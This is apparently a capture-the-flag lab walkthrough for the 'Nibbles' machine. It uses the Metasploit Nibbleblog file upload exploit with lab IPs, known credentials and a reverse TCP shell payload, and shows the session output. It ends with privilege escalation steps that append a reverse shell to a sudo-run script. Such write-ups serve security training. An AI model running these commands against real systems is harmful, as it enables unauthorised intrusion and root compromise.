### Walkthrough: Exploiting Nibbles with Metasploit
- #### **1. Start Metasploit**
	- Launch Metasploit:
    ```bash
    msfconsole
    ```
- #### **2. Search for the Exploit**
	- Search for modules related to Nibbleblog:    
    ```bash
    search nibbleblog
    ```
	- **Output**:
    ```plaintext
    #  Name                                       Disclosure Date  Rank       Check  Description
    0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
    ```
	- Select the exploit:
    ```bash
    use 0
    ```
- #### **3. Configure the Exploit**
	- Set **target IP** and **local IP**:
    ```bash
    set rhosts 10.129.42.190
    set lhost 10.10.14.2
    ```
	- View required options:
    ```bash
    show options
    ```
	- Set additional parameters:
    ```bash
    set username admin
    set password nibbles
    set targeturi nibbleblog
    ```
- #### **4. Change the Payload**
	- Use a reverse shell payload:
    ```bash
    set payload generic/shell_reverse_tcp
    ```
- #### **5. Exploit**
	- Run the exploit:
    ```bash
    exploit
    ```
	- **Output**:
    ```plaintext
    [*] Started reverse TCP handler on 10.10.14.2:4444 
    [*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
    [+] Deleted image.php
    ```
	- Verify access:
    ```bash
    id
    ```
	- **Output**:
    ```plaintext
    uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
    ```
- #### **6. Privilege Escalation**
	- Follow the **manual privilege escalation path** previously detailed:
	    1. Extract `personal.zip`.
	    2. Modify `monitor.sh` to append a reverse shell payload.
	    3. Execute the script with `sudo`.
	    4. Catch the root shell on your listener.



### **Next Steps**
1. **Experiment**:
    - Try both manual and Metasploit methods for gaining initial foothold and privilege escalation.
    - Explore other Metasploit modules or tools for alternate methods.
2. **Documentation**:
    - Take detailed notes of each step, even when following an existing guide.
    - Create a blog walkthrough or report for personal reference.
3. **Enumeration**:
    - Investigate the system for additional vulnerabilities (e.g., outdated services, misconfigurations).
    - Test alternative attack paths for practice.
